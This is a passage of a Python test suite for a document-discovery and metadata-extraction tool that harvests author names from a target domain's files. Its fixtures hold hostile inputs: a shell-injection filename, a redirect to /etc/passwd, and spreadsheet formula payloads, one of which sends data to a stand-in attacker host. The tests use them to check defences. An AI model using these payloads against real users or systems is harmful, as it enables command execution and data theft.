import contextlib
import io
import os
import shutil
import ssl
import stat
import subprocess
import tempfile
import threading
import time
import unittest
import http.server

from powermeta import cli, exif, links, sources, web
from powermeta.web import FetchError, download

from .support import LocalServer, RawServer, bing_page, patched, raw_answer, write_pdf

EXIFTOOL = exif.find_exiftool()


@contextlib.contextmanager
def patched_builtin_open(module, replacement):
    """Give one module its own open(), without touching the built-in one."""
    module.open = replacement
    try:
        yield
    finally:
        del module.open


def run_cli(arguments):
    """Run the command line and return (exit code, everything it printed)."""
    output = io.StringIO()
    with contextlib.redirect_stdout(output):
        code = cli.main(arguments)
    return code, output.getvalue()


class TemporaryFolder(unittest.TestCase):
    def setUp(self):
        self.folder = tempfile.mkdtemp(prefix="powermeta-test-")
        self.addCleanup(shutil.rmtree, self.folder, ignore_errors=True)


class Downloads(TemporaryFolder):
    def site(self, request):
        files = {
            "/files/report.pdf": write_pdf(None, "jsmith", "Writer"),
            "/other/report.pdf": write_pdf(None, "adoe", "Writer"),
            "/archive/20200101000000id_/http://site.example/gone.pdf": write_pdf(None, "archived", "Old Writer"),
        }
        if request.path in files:
            return (200, files[request.path], {"Content-Type": "application/pdf"})
        return (404, "not here")

    def run_downloads(self, file_links, archive_copies=None):
        output = io.StringIO()
        with contextlib.redirect_stdout(output):
            counts = cli.download_files(file_links, self.folder, archive_copies=archive_copies)
        return counts, output.getvalue()

    def test_files_are_saved_and_a_repeated_name_gets_a_number(self):
        with LocalServer(self.site) as server:
            counts, output = self.run_downloads([server.url + "/files/report.pdf", server.url + "/other/report.pdf", "  ", ""])
        self.assertEqual(counts, (2, 0))
        self.assertEqual(sorted(os.listdir(self.folder)), ["report-1.pdf", "report.pdf"])
        self.assertIn("[*] Downloading 2 files now.", output)

    def test_a_missing_file_is_counted_and_leaves_nothing_behind(self):
        with LocalServer(self.site) as server:
            counts, output = self.run_downloads([server.url + "/gone.pdf", "ftp://example.com/a.pdf"])
        self.assertEqual(counts, (0, 2))
        self.assertEqual(os.listdir(self.folder), [])
        self.assertIn("HTTP 404", output)
        self.assertIn("not an http or https link", output)

    def test_the_archive_copy_is_fetched_when_the_site_no_longer_has_the_file(self):
        with LocalServer(self.site) as server:
            gone = server.url + "/gone.pdf"
            copies = {gone: server.url + "/archive/20200101000000id_/http://site.example/gone.pdf"}
            counts, output = self.run_downloads([gone, server.url + "/files/report.pdf"], copies)
            paths = [request.path for request in server.requests]
        self.assertEqual(counts, (2, 0))
        self.assertEqual(sorted(os.listdir(self.folder)), ["gone.pdf", "report.pdf"])
        self.assertIn("Trying the copy in the Internet Archive", output)
        # The copy was only asked for after the site said no, and not at all for the file that is still there
        self.assertEqual(paths.count("/archive/20200101000000id_/http://site.example/gone.pdf"), 1)
        with open(os.path.join(self.folder, "gone.pdf"), "rb") as saved:
            self.assertIn(b"archived", saved.read())

    def test_hostile_names_stay_inside_the_folder(self):
        with LocalServer(lambda request: (200, b"data")) as server:
            counts, _ = self.run_downloads([server.url + "/x/..%2F..%2Fescape.pdf", server.url + "/a.pdf/exiftool.exe", server.url + "/x/-o.pdf"])
        self.assertEqual(counts, (3, 0))
        self.assertEqual(sorted(os.listdir(self.folder)), ["_-o.pdf", "_..%2F..%2Fescape.pdf", "_exiftool.exe.pdf"])

    def test_every_saved_name_ends_in_a_wanted_type(self):
        paths = ["/files/argparse.py?v=.pdf", "/files/setup.exe?doc=.pdf", "/files/run.bat?x.pdf", "/files/report.pdf.lnk", "/get.php?file=a.docx"]
        with LocalServer(lambda request: (200, b"data")) as server:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                counts = cli.download_files([server.url + path for path in paths], self.folder, file_types=["pdf", "docx"])
        self.assertEqual(counts, (5, 0))
        self.assertEqual(
            sorted(os.listdir(self.folder)), ["argparse.py.pdf", "get.php.docx", "report.pdf.lnk.pdf", "run.bat.pdf", "setup.exe.pdf"]
        )

    def test_an_address_with_spaces_or_other_characters_is_asked_for_in_plain_form(self):
        with LocalServer(lambda request: (200, b"data")) as server:
            counts, output = self.run_downloads([server.url + "/files/annual report \u00fc.pdf", "http://[bad/a.pdf", "http://127.0.0.1:99999/a.pdf"])
            paths = [request.path for request in server.requests]
        self.assertEqual(counts, (1, 2))
        self.assertEqual(paths, ["/files/annual%20report%20%C3%BC.pdf"])
        self.assertEqual(os.listdir(self.folder), ["annual report _.pdf"])


class BrokenAnswers(TemporaryFolder):
    """Whatever a server sends, one bad file must not end the run or be counted as downloaded."""

    ANSWERS = {
        "/garbage.pdf": b"NOT HTTP AT ALL\r\n\r\n",
        "/short.pdf": b"HTTP/1.1 200 OK\r\nContent-Length: 100000\r\n\r\n" + b"x" * 500,
        "/chunk.pdf": b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n1000\r\n" + b"x" * 100,
        "/header.pdf": b"HTTP/1.1 200 OK\r\nX: " + b"a" * 70000 + b"\r\n\r\n",
        "/toftp.pdf": b"HTTP/1.1 302 Found\r\nLocation: ftp://127.0.0.1:1/x.pdf\r\nContent-Length: 0\r\n\r\n",
        "/tofile.pdf": b"HTTP/1.1 302 Found\r\nLocation: file:///etc/passwd\r\nContent-Length: 0\r\n\r\n",
        "/big.pdf": b"HTTP/1.1 200 OK\r\nContent-Length: 99999999999\r\n\r\n" + b"x" * 500,
        "/fine.pdf": raw_answer(b"%PDF-fine"),
    }

    def test_each_one_is_a_failed_download_and_leaves_nothing_behind(self):
        with RawServer(lambda path: self.ANSWERS[path]) as server:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                counts = cli.download_files([server.url + path for path in self.ANSWERS], self.folder)
        self.assertEqual(counts, (1, 7), output.getvalue())
        self.assertEqual(os.listdir(self.folder), ["fine.pdf"])
        text = output.getvalue()
        self.assertIn("the connection closed after 500 of 100000 bytes", text)
        self.assertIn("redirect to a link that is not http or https", text)
        self.assertIn("the file is larger than", text)

    def test_a_file_that_is_cut_off_is_fetched_from_the_archive_instead(self):
        answers = dict(self.ANSWERS)
        answers["/web/2020id_/short.pdf"] = raw_answer(b"%PDF-whole")
        with RawServer(lambda path: answers[path]) as server:
            output = io.StringIO()
            with contextlib.redirect_stdout(output):
                counts = cli.download_files(
                    [server.url + "/short.pdf"], self.folder, archive_copies={server.url + "/short.pdf": server.url + "/web/2020id_/short.pdf"}
                )
        self.assertEqual(counts, (1, 0))
        with open(os.path.join(self.folder, "short.pdf"), "rb") as saved:
            self.assertEqual(saved.read(), b"%PDF-whole")

    def test_a_download_without_end_is_stopped(self):
        def endless(path):
            yield b"HTTP/1.1 200 OK\r\n\r\n"
            while True:
                yield b"\0" * 65536

        target = os.path.join(self.folder, "endless.pdf")
        with RawServer(endless) as server:
            with self.assertRaises(FetchError) as raised:
                download(server.url + "/endless.pdf", target, max_bytes=3 * 1024 * 1024)
        self.assertIn("larger than 3 MB", str(raised.exception))
        self.assertEqual(os.listdir(self.folder), [])

    def test_a_file_the_server_compressed_on_the_way_is_unpacked(self):
        import gzip

        body = write_pdf(None, "jsmith", "Writer")
        packed = gzip.compress(body)
        answers = {
            "/a.pdf": raw_answer(packed, b"Content-Encoding: gzip\r\n"),
            "/cut.pdf": raw_answer(packed[:60], b"Content-Encoding: gzip\r\n"),
        }
        with RawServer(lambda path: answers[path]) as server:
            target = os.path.join(self.folder, "a.pdf")
            download(server.url + "/a.pdf", target)
            with open(target, "rb") as saved:
                self.assertEqual(saved.read(), body)
            with self.assertRaises(FetchError):
                download(server.url + "/cut.pdf", os.path.join(self.folder, "cut.pdf"))
        self.assertEqual(os.listdir(self.folder), ["a.pdf"])

    def test_a_download_that_trickles_is_stopped_after_a_while(self):
        def trickle(path):
            yield b"HTTP/1.1 200 OK\r\nContent-Length: 1000000\r\n\r\n"
            while True:
                yield b"x"
                time.sleep(0.2)

        started = time.time()
        with RawServer(trickle) as server:
            with self.assertRaises(FetchError) as raised:
                download(server.url + "/slow.pdf", os.path.join(self.folder, "slow.pdf"), timeout=5, max_seconds=1)
        self.assertIn("took longer than", str(raised.exception))
        self.assertLess(time.time() - started, 10)
        self.assertEqual(os.listdir(self.folder), [])

    def test_a_file_that_cannot_be_written_here_is_not_the_site_s_fault(self):
        # A full disk or a folder that is not writable: the Internet Archive is not asked, and the
        # downloads stop instead of failing one by one
        real_open = open

        def full_disk(path, mode="r", *args, **kwargs):
            if "w" in mode and os.path.basename(path).startswith(".part-"):
                raise OSError(28, "No space left on device")
            return real_open(path, mode, *args, **kwargs)

        answers = {"/a.pdf": raw_answer(b"%PDF-a"), "/b.pdf": raw_answer(b"%PDF-b"), "/c.pdf": raw_answer(b"%PDF-c")}
        with RawServer(lambda path: answers.get(path, raw_answer(b"copy"))) as server:
            file_links = [server.url + path for path in answers]
            copies = {link: server.url + "/web/2020id_/" + link for link in file_links}
            with patched_builtin_open(web, full_disk):
                output = io.StringIO()
                with contextlib.redirect_stdout(output):
                    counts = cli.download_files(file_links, self.folder, archive_copies=copies)
            asked = list(server.paths)
        self.assertEqual(counts, (0, 3))
        self.assertEqual(asked, ["/a.pdf"])
        self.assertIn("could not be written ([Errno 28] No space left on device). The downloads stop here: 3 files were not downloaded.", output.getvalue())
        self.assertNotIn("Internet Archive", output.getvalue())
        self.assertEqual(os.listdir(self.folder), [])

    def test_the_working_file_is_never_an_earlier_download(self):
        earlier = os.path.join(self.folder, "a.pdf.part")
        with open(earlier, "wb") as target:
            target.write(b"an earlier file")
        with RawServer(lambda path: raw_answer(b"%PDF-fine")) as server:
            download(server.url + "/a.pdf", os.path.join(self.folder, "a.pdf"))
        self.assertEqual(sorted(os.listdir(self.folder)), ["a.pdf", "a.pdf.part"])
        with open(earlier, "rb") as saved:
            self.assertEqual(saved.read(), b"an earlier file")

    def test_an_interrupted_download_leaves_no_partial_file(self):
        opened = []
        real_open = open

        class Interrupted:
            """A file that is interrupted (as by Ctrl+C) at the first write."""

            def __init__(self, path, mode):
                self._file = real_open(path, mode)
                opened.append(path)

            def close(self):
                self._file.close()

            def write(self, block):
                self._file.write(block)
                raise KeyboardInterrupt

        with RawServer(lambda path: raw_answer(b"x" * 5000)) as server:
            with patched_builtin_open(web, Interrupted):
                with self.assertRaises(KeyboardInterrupt):
                    download(server.url + "/a.pdf", os.path.join(self.folder, "a.pdf"))
        self.assertEqual([os.path.basename(path) for path in opened], [".part-a.pdf"])
        self.assertEqual(os.listdir(self.folder), [])


@unittest.skipUnless(shutil.which("openssl"), "openssl is needed to make a test certificate")
class Certificates(TemporaryFolder):
    """Files from the target are fetched even from a server with a self-signed certificate; everything
    else (such as copies from the Internet Archive) is checked as usual."""

    def setUp(self):
        super().setUp()
        key, certificate = os.path.join(self.folder, "key.pem"), os.path.join(self.folder, "cert.pem")
        subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", certificate, "-days", "1", "-subj", "/CN=localhost"],
            check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Length", "4")
                self.end_headers()
                self.wfile.write(b"data")

        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certificate, key)
        self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.addCleanup(self.server.server_close)
        self.addCleanup(self.server.shutdown)
        self.url = "https://127.0.0.1:%d/a.pdf" % self.server.server_address[1]

    def test_self_signed_certificate(self):
        # A proxy configured for the test machine must not get between the test and its own server
        with patched(os, environ={k: v for k, v in os.environ.items() if not k.lower().endswith("_proxy")}):
            target = os.path.join(self.folder, "a.pdf")
            with self.assertRaises(FetchError):
                download(self.url, target, verify_certificate=True, timeout=20)
            self.assertFalse(os.path.exists(target))
            download(self.url, target, verify_certificate=False, timeout=20)
            with open(target, "rb") as saved:
                self.assertEqual(saved.read(), b"data")


class ExifToolLookup(TemporaryFolder):
    def test_the_current_directory_is_never_searched(self):
        name = "exiftool.exe" if os.name == "nt" else "exiftool"
        planted = os.path.join(self.folder, name)
        with open(planted, "w") as target:
            target.write("#!/bin/sh\necho 99.99\n")
        os.chmod(planted, os.stat(planted).st_mode | stat.S_IXUSR)
        here = os.getcwd()
        os.chdir(self.folder)
        try:
            with patched(os, environ=dict(os.environ, PATH=os.pathsep.join(["", ".", "relative/bin"]))):
                self.assertIsNone(exif._on_path("exiftool"))
            with patched(os, environ=dict(os.environ, PATH=self.folder)):
                self.assertEqual(exif._on_path("exiftool"), planted)
        finally:
            os.chdir(here)

    @unittest.skipIf(os.name == "nt", "uses a shell script as a stand-in for an old ExifTool")
    def test_an_old_exiftool_is_refused(self):
        for reported, usable in (("10.47", False), ("12.23", False), ("12.24", True), ("13.64", True), ("nonsense", False)):
            fake = os.path.join(self.folder, "exiftool-" + reported)
            with open(fake, "w") as target:
                target.write("#!/bin/sh\necho %s\n" % reported)
            os.chmod(fake, 0o755)
            messages = []
            with patched(exif, find_exiftool=lambda: fake):
                self.assertEqual(exif.usable_exiftool(messages.append) is not None, usable, reported)
            if reported == "10.47":
                self.assertIn("CVE-2021-22204", "\n".join(messages))

    def test_missing_exiftool_is_explained(self):
        messages = []
        with patched(exif, find_exiftool=lambda: None):
            self.assertIsNone(exif.usable_exiftool(messages.append))
        self.assertIn("was not found", "\n".join(messages))


@unittest.skipUnless(EXIFTOOL, "ExifTool is not installed")
class Extraction(TemporaryFolder):
    def setUp(self):
        super().setUp()
        self.files = os.path.join(self.folder, "files with space")
        os.mkdir(self.files)
        write_pdf(os.path.join(self.files, "one.pdf"), "jsmith", "Writer, version 1")
        # A name that a shell would run as a command
        write_pdf(os.path.join(self.files, "two$(touch INJECTED);.pdf"), "adoe", "Writer, version 1")
        write_pdf(os.path.join(self.files, "no extension"), "12345", None)

    def test_authors_and_creators(self):
        count, values = exif.extract_authors(EXIFTOOL, self.files)
        self.assertEqual(count, 3)
        # A value with a comma stays in one piece, and a numeric author is kept as text
        self.assertEqual(values, ["12345", "adoe", "jsmith", "Writer, version 1"])
        self.assertFalse(os.path.exists("INJECTED"))
        self.assertEqual(sorted(os.listdir(self.files)), ["no extension", "one.pdf", "two$(touch INJECTED);.pdf"])

    def test_everything_to_csv(self):
        target = os.path.join(self.folder, "all.csv")
        self.assertEqual(exif.extract_all_to_csv(EXIFTOOL, self.files, target), 3)
        with open(target, "rb") as saved:
            data = saved.read()
        self.assertTrue(data.startswith(b"\xef\xbb\xbf"))
        self.assertIn(b"SourceFile", data.splitlines()[0])
        self.assertEqual(len(data.decode("utf-8-sig").strip().splitlines()), 4)

    def test_cells_that_a_spreadsheet_would_run_are_made_plain_text(self):
        import csv

        formula = '=HYPERLINK("http://evil.example/?"&A1,"click")'
        command = "@SUM(1+1)*cmd|' /C calc'!A0"
        hostile = os.path.join(self.folder, "hostile")
        os.mkdir(hostile)
        write_pdf(os.path.join(hostile, "formula.pdf"), formula, command)
        write_pdf(os.path.join(hostile, "plain.pdf"), "-5", "+0.3")
        target = os.path.join(self.folder, "hostile.csv")
        self.assertEqual(exif.extract_all_to_csv(EXIFTOOL, hostile, target), 2)
        with open(target, encoding="utf-8-sig", newline="") as saved:
            rows = list(csv.DictReader(saved))
        by_file = {os.path.basename(row["SourceFile"]): row for row in rows}
        self.assertEqual(by_file["formula.pdf"]["Author"], "'" + formula)
        self.assertEqual(by_file["formula.pdf"]["Creator"], "'" + command)
        # Plain numbers are no formulas and stay as they are
        self.assertEqual((by_file["plain.pdf"]["Author"], by_file["plain.pdf"]["Creator"]), ("-5", "+0.3"))
        for row in rows:
            for value in row.values():
                self.assertFalse(value[:1] in "=@" and value, value)

    def test_empty_folder(self):
        empty = os.path.join(self.folder, "empty")
        os.mkdir(empty)
        self.assertEqual(exif.extract_authors(EXIFTOOL, empty), (0, []))
        self.assertEqual(exif.extract_all_to_csv(EXIFTOOL, empty, os.path.join(self.folder, "none.csv")), 0)
        self.assertFalse(os.path.exists(os.path.join(self.folder, "none.csv")))


class CsvCells(unittest.TestCase):
    def test_which_cells_get_an_apostrophe(self):
        cases = {
            "=1+1": "'=1+1",
            "+1+1": "'+1+1",
            "-1+cmd|' /C calc'!A0": "'-1+cmd|' /C calc'!A0",
            "@SUM(A1)": "'@SUM(A1)",
            # A tab or a line break also starts a cell for some programs, so what follows is made plain too
            "\t=1+1": "'\t'=1+1",
            "\r=1+1": "'\r'=1+1",
            # Inside a cell: where a program that splits on semicolons, tabs or line breaks starts a new cell
            "x;=cmd|'/C calc'!A0;": "x;'=cmd|'/C calc'!A0;",
            "Smith;=HYPERLINK(A1&B1);": "Smith;'=HYPERLINK(A1&B1);",
            'x";=1+1;"': 'x";\'=1+1;"',
            "x; =1+1": "x;' =1+1",
            "x\t=1+1": "x\t'=1+1",
            "x\n=1+1": "x\n'=1+1",
            "x\r\n@SUM(A1)": "x\r\n'@SUM(A1)",
            "a;b;c": "a;b;c",
            "1;2": "1;2",
            "-5": "-5",
            "+0.3": "+0.3",
            "-1,5": "-1,5",
            "-1/3": "'-1/3",
            "+02:00": "'+02:00",
            "John Smith": "John Smith",
            "a=b": "a=b",
            "": "",
        }
        for cell, expected in cases.items():
            self.assertEqual(exif.inert_cell(cell), expected, repr(cell))

    @unittest.skipIf(os.name == "nt", "uses a shell script as a stand-in for ExifTool")
    def test_the_whole_file_is_rewritten_also_with_line_breaks_and_nul_characters(self):
        import csv

        folder = tempfile.mkdtemp(prefix="powermeta-test-")
        self.addCleanup(shutil.rmtree, folder, ignore_errors=True)
        fake = os.path.join(folder, "fake-exiftool")
        with open(fake, "w") as target:
            target.write(
                "#!/bin/sh\n"
                "printf 'SourceFile,Author,-Odd,Comment\\r\\n'\n"
                "printf 'a.pdf,=1+1,x,\"two\\nlines, one cell\"\\r\\n'\n"
                "printf 'b.pdf,nul\\000inside,-2,\"say \"\"hi\"\"\"\\r\\n'\n"
            )
        os.chmod(fake, 0o755)
        target = os.path.join(folder, "out.csv")
        self.assertEqual(exif.extract_all_to_csv(fake, folder, target), 2)
        with open(target, encoding="utf-8-sig", newline="") as saved:
            rows = list(csv.reader(saved))
        self.assertEqual(
            rows,
            [
                ["SourceFile", "Author", "'-Odd", "Comment"],
                ["a.pdf", "'=1+1", "x", "two\nlines, one cell"],
                ["b.pdf", "nulinside", "-2", 'say "hi"'],
            ],
        )


class CommandLine(TemporaryFolder):
    """The whole run against a local stand-in: the target site is 127.0.0.1, and the same server answers
    as the Internet Archive's index, as Bing and as DuckDuckGo."""

    bing_keeps_to_site = True

    def respond(self, request):
        base = self.server.url
        if request.path == "/cdx":
            return (200, "%s/files/report.pdf 20200101000000\n%s/gone.pdf 20190101000000\n" % (base, base), {"Content-Type": "text/plain"})
        if request.path == "/bing":
            if "first" not in request.query:  # the search for the site alone
                return (200, bing_page([base + "/"] if self.bing_keeps_to_site else ["http://other.example/", "http://unrelated.example/a.pdf"]))
            if request.query["q"][0].endswith("filetype:pdf") and request.query["first"][0] == "1":
                return (200, bing_page([base + "/files/report.pdf", base + "/files/second.pdf"]))
            return (200, bing_page([]))
        if request.path == "/ddg":
            return (403, "Forbidden")
        if request.path == "/files/report.pdf":
            return (200, write_pdf(None, "jsmith", "Writer"), {"Content-Type": "application/pdf"})
        if request.path == "/files/second.pdf":
            return (200, write_pdf(None, "adoe", "Writer"), {"Content-Type": "application/pdf"})
        if request.path.startswith("/web/20190101000000id_/"):
            return (200, write_pdf(None, "former.employee", "Old Writer"), {"Content-Type": "application/pdf"})
        return (404, "not here")

    def run_with_server(self, arguments):
        with LocalServer(self.respond) as server:
            self.server = server
            with patched(sources, ARCHIVE_INDEX_URL=server.url + "/cdx", BING_URL=server.url + "/bing", DUCKDUCKGO_URL=server.url + "/ddg"):
                with patched(links, ARCHIVE_COPY_PREFIX=server.url + "/web/"):
                    code, output = run_cli(arguments)
            return code, output, server

    def test_search_download_extract(self):
        out = os.path.join(self.folder, "out")
        listed = os.path.join(self.folder, "links.txt")
        code, output, server = self.run_with_server(
            ["-d", "127.0.0.1", "-t", "pdf, docx", "--delay", "0", "--download", "--extract", "-o", out, "--list-out", listed]
        )
        self.assertEqual(code, 0, output)
        self.assertIn("[*] Internet Archive: 2 files found", output)
        self.assertIn("[*] Bing: 2 pdf files found", output)
        self.assertIn("It is skipped for the rest of this run", output)
        self.assertIn("[*] A total of 3 files were discovered.", output)
        # DuckDuckGo refused once and was not asked again for the second file type
        self.assertEqual(sum(1 for request in server.requests if request.path == "/ddg"), 1)
        # Bing: once for the site alone, two pages for pdf, one for docx
        self.assertEqual(sum(1 for request in server.requests if request.path == "/bing"), 4)
        self.assertEqual(sum(1 for request in server.requests if request.path == "/cdx"), 1)
        self.assertEqual(sorted(os.listdir(out)), ["gone.pdf", "report.pdf", "second.pdf"])
        self.assertIn("Trying the copy in the Internet Archive", output)
        self.assertIn("[*] Downloaded 3 files", output)
        with open(listed, encoding="ascii") as saved:
            self.assertEqual(len(saved.read().split()), 3)
        if EXIFTOOL:
            for author in ("adoe", "former.employee", "jsmith", "Old Writer", "Writer"):
                self.assertIn("\n" + author + "\n", output)

    def test_without_a_terminal_nothing_is_downloaded_unless_asked(self):
        out = os.path.join(self.folder, "out")
        with patched(cli.sys, stdin=io.StringIO("")):
            code, output, _ = self.run_with_server(["-d", "http://127.0.0.1/", "-t", "pdf", "--sources", "archive", "-o", out])
        self.assertEqual(code, 0, output)
        self.assertIn("[*] A total of 2 files were discovered.", output)
        self.assertIn("No files will be downloaded", output)
        self.assertFalse(os.path.exists(out))

    def test_list_in_skips_searching(self):
        listed = os.path.join(self.folder, "links.txt")
        out = os.path.join(self.folder, "out")
        with LocalServer(self.respond) as server:
            self.server = server
            with open(listed, "w", encoding="utf-8-sig") as target:
                target.write(server.url + "/files/report.pdf\n\n" + server.url + "/gone.pdf\n")
            code, output = run_cli(["-d", "127.0.0.1", "--list-in", listed, "--download", "-o", out])
            paths = [request.path for request in server.requests]
        self.assertEqual(code, 0, output)
        self.assertIn("[*] A total of 2 files were found.", output)
        self.assertEqual(paths, ["/files/report.pdf", "/gone.pdf"])
        self.assertIn("[*] Downloaded 1 files", output)

    def test_engines_searched_in_the_browser_are_not_also_asked_with_plain_requests(self):
        from powermeta import browser

        calls, options = [], {}

        def fake_search(engines, domain, file_types, max_pages, delay, browser_name, log, on_link=None, **more):
            calls.append((list(engines), domain, list(file_types), browser_name))
            options.update(more)
            # The browser finds today's https address of a file the Archive lists under http
            return ["https://127.0.0.1:%d/files/report.pdf" % self.server.port, "http://127.0.0.1:%d/files/browser-only.pdf" % self.server.port]

        with patched(browser, search=fake_search):
            code, output, server = self.run_with_server(
                [
                    "-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--browser", "google,bing", "--browser-name", "edge",
                    "--list-out", os.path.join(self.folder, "l.txt"), "--google-lookup", "request", "--save-pages", os.path.join(self.folder, "pages"),
                ]
            )
        self.assertEqual(code, 0, output)
        self.assertEqual(calls, [(["google", "bing"], "127.0.0.1", ["pdf"], "edge")])
        self.assertEqual(
            options, {"ask": cli.ask_person, "lookup": "request", "user_agent": None, "save_pages": os.path.join(self.folder, "pages")}
        )
        paths = [request.path for request in server.requests]
        # Bing went through the browser, so only DuckDuckGo and the Archive were asked with plain requests
        self.assertNotIn("/bing", paths)
        self.assertIn("/ddg", paths)
        self.assertIn("/cdx", paths)
        with open(os.path.join(self.folder, "l.txt")) as saved:
            listed = saved.read().split()
        # report.pdf is listed once, under the address the browser found; gone.pdf comes from the Archive
        self.assertEqual(
            listed,
            sorted(["https://127.0.0.1:%d/files/report.pdf" % server.port, "http://127.0.0.1:%d/files/browser-only.pdf" % server.port, "http://127.0.0.1:%d/gone.pdf" % server.port]),
        )

    def test_without_a_terminal_a_question_of_the_browser_search_is_not_waited_for(self):
        output = io.StringIO()
        with patched(cli.sys, stdin=io.StringIO("")), contextlib.redirect_stdout(output):
            with self.assertRaises(EOFError):
                cli.ask_person("[?] Deal with it there, then press Enter here. ")
        self.assertIn("Not asked, because there is no terminal.", output.getvalue())

    def test_bing_is_not_asked_for_files_when_it_does_not_keep_to_the_site(self):
        self.bing_keeps_to_site = False
        with patched(cli.sys, stdin=io.StringIO("")):
            code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf, docx", "--delay", "0"])
        self.assertEqual(code, 0, output)
        self.assertIn("with pages of other sites (0 of its 2 results are on the site)", output)
        self.assertEqual(sum(1 for request in server.requests if request.path == "/bing"), 1)
        # The Internet Archive's files are still there, and nothing of another site was kept
        self.assertIn("[*] A total of 2 files were discovered.", output)

    def test_an_output_folder_that_cannot_be_used_is_noticed_before_the_search(self):
        a_file = os.path.join(self.folder, "a file")
        open(a_file, "w").close()
        for unusable in (a_file, os.path.join(a_file, "sub", "folder")):
            code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--download", "-o", unusable])
            self.assertEqual(code, 1, output)
            self.assertIn("cannot be used", output)
            self.assertEqual(server.requests, [])
        # A folder that does not exist yet, below one that does, is fine
        code, output, _ = self.run_with_server(
            ["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--download", "-o", os.path.join(self.folder, "new", "deeper")]
        )
        self.assertEqual(code, 0, output)

    def test_links_are_printed_when_the_output_folder_fails_after_the_search(self):
        def refuse(*args, **kwargs):
            raise OSError(30, "Read-only file system")

        with patched(cli, download_files=refuse):
            code, output, server = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--download"])
        self.assertEqual(code, 1, output)
        self.assertIn("The links that were found", output)
        self.assertIn("\n%s/gone.pdf\n" % server.url, output)

    @unittest.skipIf(os.name == "nt", "uses a shell script as a stand-in for ExifTool")
    def test_a_metadata_value_is_printed_on_one_line(self):
        records = r'[{"SourceFile": "a.pdf", "Author": "Eve\n[*] Downloaded 0 files (999 failed).\r\n[!] Run this command", "Creator": ["two\twords", " Writer "]}]'
        fake = os.path.join(self.folder, "fake-exiftool")
        with open(fake, "w") as target:
            target.write("#!/bin/sh\ncat <<'END'\n%s\nEND\n" % records)
        os.chmod(fake, 0o755)
        self.assertEqual(
            exif.extract_authors(fake, self.folder), (1, ["Eve [*] Downloaded 0 files (999 failed). [!] Run this command", "two words", "Writer"])
        )

    def test_bad_input_is_explained(self):
        self.assertEqual(run_cli(["-d", "not a domain"])[0], 1)
        self.assertIn("No file types", run_cli(["-d", "example.com", "-t", "p df"])[1])
        for delay in ("inf", "nan", "-1", "1e400"):
            with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
                cli.main(["-d", "example.com", "--delay", delay])
        code, output, _ = self.run_with_server(["-d", "127.0.0.1", "-t", "pdf, docx; xlsx, tar.gz", "--sources", "archive", "--delay", "0"])
        self.assertIn("'docx; xlsx' is not a file type and is left out", output)
        self.assertIn("'tar.gz' is not a file type and is left out", output)
        with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
            cli.main(["-d", "example.com", "--sources", "altavista"])
        with self.assertRaises(SystemExit), contextlib.redirect_stderr(io.StringIO()):
            cli.main(["-d", "example.com", "--google-lookup", "guess"])
        errors = io.StringIO()
        with self.assertRaises(SystemExit), contextlib.redirect_stderr(errors):
            cli.main(["--download"])
        self.assertIn("--list-in", errors.getvalue())

    def test_a_list_written_by_windows_powershell_is_read(self):
        # Windows PowerShell 5.1 writes UTF-16 with a byte-order mark for ">" and Out-File
        out = os.path.join(self.folder, "out")
        with LocalServer(self.respond) as server:
            self.server = server
            text = server.url + "/files/report.pdf\r\n\r\n  " + server.url + "/files/second.pdf  \r\n"
            for number, encoding in enumerate(("utf-16", "utf-16-be", "utf-8-sig", "utf-8")):
                listed = os.path.join(self.folder, "links-%d.txt" % number)
                with open(listed, "wb") as target:
                    target.write((b"\xfe\xff" if encoding == "utf-16-be" else b"") + text.encode(encoding))
                # No domain is needed when the links come from a list
                code, output = run_cli(["--list-in", listed, "--download", "-o", out + str(number)])
                self.assertEqual(code, 0, output)
                self.assertIn("[*] Downloaded 2 files", output, encoding)
                self.assertEqual(sorted(os.listdir(out + str(number))), ["report.pdf", "second.pdf"])

    def test_a_link_list_that_cannot_be_written_is_noticed_before_the_search(self):
        code, output, server = self.run_with_server(
            ["-d", "127.0.0.1", "-t", "pdf", "--delay", "0", "--list-out", os.path.join(self.folder, "missing", "links.txt")]
        )
        self.assertEqual(code, 1, output)
        self.assertIn("does not exist", output)
        self.assertEqual(server.requests, [])

    def test_links_are_printed_when_writing_the_list_fails_after_the_search(self):
        def refuse(path, file_links):
            return real_write(os.path.join(self.folder, "missing", "links.txt"), file_links)

        real_write = cli.write_link_list
        with patched(cli, write_link_list=refuse), patched(cli.sys, stdin=io.StringIO("")):
            code, output, server = self.run_with_server(
                ["-d", "127.0.0.1", "-t", "pdf", "--sources", "archive", "--list-out", os.path.join(self.folder, "links.txt")]
            )
        self.assertEqual(code, 0, output)
        self.assertIn("They are listed here instead:", output)
        self.assertIn("\n%s/files/report.pdf\n" % server.url, output)

    def test_the_exit_code_says_when_nothing_could_be_downloaded_or_extracted(self):
        out = os.path.join(self.folder, "out")
        listed = os.path.join(self.folder, "links.txt")
        with LocalServer(self.respond) as server:
            self.server = server
            with open(listed, "w") as target:
                target.write(server.url + "/nowhere.pdf\n" + server.url + "/nowhere-2.pdf\n")
            code, output = run_cli(["--list-in", listed, "--download", "--extract", "-o", out])
            self.assertEqual(code, 1, output)
            self.assertIn("(2 failed)", output)
            self.assertNotIn("extracting metadata", output)

            with open(listed, "w") as target:
                target.write(server.url + "/files/report.pdf\n")
            with patched(exif, find_exiftool=lambda: None):
